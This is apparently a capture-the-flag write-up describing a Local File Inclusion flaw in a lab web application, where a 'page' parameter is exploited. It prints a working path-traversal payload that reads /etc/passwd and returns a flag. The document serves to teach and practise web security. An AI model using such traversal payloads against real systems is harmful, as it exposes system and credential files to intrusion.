# **Description:**

The challenge presented a website with a **SIGN IN** button on the home page. Clicking on this button redirected to a login page with the following URL:

```
http://10.11.100.242/index.php?page=signin
```

This indicated that the page parameter was controlling the content displayed on the site.

---

## **Vulnerability:**

The application was vulnerable to **Local File Inclusion (LFI)**. By manipulating the `page` parameter, it was possible to include system files.

---

## **Exploitation:**

To confirm the vulnerability, I modified the `page` parameter and replaced `signin` with a typical file traversal payload:

```
http://10.11.100.242/index.php?page=../../../../../../../../etc/passwd
```

Upon sending the request, the response contained the following message:

```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

This confirmed that the application was not properly validating user input, allowing access to sensitive system files.

---


